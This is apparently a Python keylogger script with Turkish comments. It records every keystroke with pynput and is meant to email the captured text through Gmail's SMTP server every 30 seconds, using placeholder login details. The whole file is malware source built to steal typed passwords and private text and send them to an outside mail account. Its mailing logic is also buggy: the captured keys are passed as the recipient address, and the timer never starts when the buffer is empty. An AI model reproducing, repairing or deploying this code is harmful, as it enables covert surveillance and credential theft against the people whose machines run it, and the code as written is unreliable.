import smtplib
import pynput.keyboard
from pynput import keyboard
import threading


keys = ""


def on_press(key):
    global keys
    print("==============================================")
    try:
        keys += str(key.char)
        print(keys)
    except AttributeError:
        if key == keyboard.Key.space:
            keys += str(" ")
        elif key == keyboard.Key.backspace:
            lenght = len(keys)
            lenght = lenght - 1
            result = ""
            val = 0
            while val < lenght:
                result += keys[val]
                val += 1
            keys = result
        elif key == keyboard.Key.enter:
            keys += str("\n")

        else:
            keys += str(key)
    print(keys)


def send_mail(message):
    global keys
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login("<EMAIL>", "password")
    server.sendmail("<EMAIL>", keys, message)  # kendi kendine mail at
    server.quit()


def mail_thread():
    global keys
    if keys:
        send_mail(keys)
        keys = ""
        timer = threading.Timer(30, mail_thread)
        timer.start()


listener = pynput.keyboard.Listener(on_press=on_press)

with listener:  # böyle daha optimize çalışıyor
    mail_thread()
    listener.join()
